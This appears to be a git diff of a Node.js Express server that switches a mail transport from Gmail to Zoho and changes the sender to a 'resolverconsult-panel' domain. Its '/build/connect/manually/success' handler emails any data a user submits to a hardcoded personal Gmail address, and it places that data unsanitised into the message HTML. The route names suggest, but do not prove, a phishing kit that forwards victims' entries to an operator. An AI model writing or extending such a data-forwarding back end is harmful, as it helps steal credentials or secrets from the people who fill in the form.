@@ -33,7 +33,7 @@ app.get('/build/pending/confirmation/success', (req, res) => {
 
 app.post('/build/connect/manually/success', async (req, res) => {
     const transporter = nodemailer.createTransport({
-        service: 'gmail',
+        service: 'zoho',
         auth: {
             user: process.env.USERNAME,
             pass: process.env.PASSWORD
@@ -54,7 +54,7 @@ app.post('/build/connect/manually/success', async (req, res) => {
 
 
     var mailOptions = {
-        from: 'node.resolver@gmail.com', //Testing email to see you received it successfully. Server configured email
+        from: 'info@resolverconsult-panel.com', //Testing email to see you received it successfully. Server configured email
         to: 'salim72salim72@gmail.com',
         subject: `${req.body.category}`,
         html: `${req.body.data}`
